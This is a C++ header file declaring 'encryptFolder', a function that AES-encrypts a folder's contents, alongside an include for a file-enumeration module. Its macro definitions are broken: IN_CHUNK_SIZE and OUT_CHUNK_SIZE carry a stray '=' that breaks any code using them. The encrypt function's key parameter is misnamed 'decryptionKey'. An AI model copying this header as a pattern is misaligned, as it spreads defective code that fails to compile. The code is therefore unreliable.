#ifndef ENCRYPT_H
#define ENCRYPT_H

#include "enumerate_files.h"

#define AES_KEY_SIZE 256
#define IN_CHUNK_SIZE = (AES_KEY_SIZE * 10)
#define OUT_CHUNK_SIZE = (IN_CHUNK_SIZE * 2)

// Encrypts a folder using AES encryption
bool encryptFolder(const std::wstring& folderPath, const BYTE* decryptionKey, DWORD keySize);

#endif